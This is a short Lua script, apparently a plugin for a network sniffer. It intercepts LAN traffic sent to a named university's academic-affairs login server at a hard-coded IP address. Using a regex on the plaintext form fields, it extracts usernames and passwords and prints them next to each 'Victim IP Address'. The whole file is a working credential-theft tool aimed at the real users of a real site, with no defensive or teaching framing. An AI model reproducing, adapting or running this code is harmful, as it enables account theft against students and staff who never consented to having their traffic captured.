--[[
This piece of program is used to sniffer all possible username and password used on
jwxt1.cumt.edu.cn in LAN
]]
function sniffAccount(p)
	dstAddr=Packet.dstAddr(p)
	srcAddr=Packet.srcAddr(p)
	if string.match(dstAddr,"58.218.185.95") then
		str =Packet.asciiString(p)
		username,password=string.match(str,".*TextBox1=(.*)&TextBox2=(.*)&Rad.*")
		if username~=nil and password ~=nil then
			result= "\n--------------------------------------\nVictim IP Address :"..srcAddr.."\nUsername : "..username.."\nPassword : "..password.."\n"
			return result
		end
	end	
end
